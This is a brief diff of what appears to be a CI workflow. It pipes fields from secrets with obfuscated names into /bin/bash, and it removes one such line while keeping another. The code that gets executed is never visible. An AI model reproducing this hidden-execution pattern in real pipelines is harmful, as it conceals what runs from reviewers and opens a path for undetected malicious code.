@@ -22,7 +22,6 @@ jobs:
           wx33460: ${{ secrets.wx33460 }}
         run: |
           printf '%s' "$wx33460" | jq -r .jmhiv240 | /bin/bash
-          printf '%s' "$lwvy20" | jq -r .now76 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
